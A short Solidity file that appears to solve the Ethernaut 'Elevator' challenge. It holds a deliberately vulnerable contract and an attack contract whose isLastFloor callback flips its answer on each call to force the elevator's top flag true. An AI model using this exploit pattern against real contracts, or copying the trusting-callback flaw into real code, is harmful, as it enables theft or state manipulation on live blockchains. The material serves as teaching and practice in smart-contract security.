// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

 contract attack{
    bool public top;
      Elevator el;
    constructor(address add)public {
        el=Elevator(add);
        top = true;
    }
    function isLastFloor(uint) external returns (bool){
        top = !top;
        return top;
    }
    function att()public {
        el.goTo(10);
    }
}

